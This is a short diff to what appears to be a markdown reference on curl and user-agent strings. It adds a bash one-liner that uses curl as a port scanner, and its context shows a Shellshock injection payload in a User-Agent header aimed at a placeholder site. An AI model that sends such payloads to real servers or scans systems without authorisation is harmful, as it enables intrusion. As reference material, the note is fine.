@@ -358,6 +358,11 @@ curl http://www.foo.com 2>/dev/null \
 curl -H "User-Agent: () { :; }; /bin/ls" http://vulnerablesitegoeshere.net/
 ```
 
+- As a portscanner
+```
+for i in {1..65535}; do curl -s -m 2 localhost:$i >/dev/null; if [ ! $? -eq 7 ] && [ ! $? -eq 28 ]; then echo open: $i; fi; done
+```
+
 # Windows Platform Tokens
 
 These strings are found in user agent strings in browsers amongst
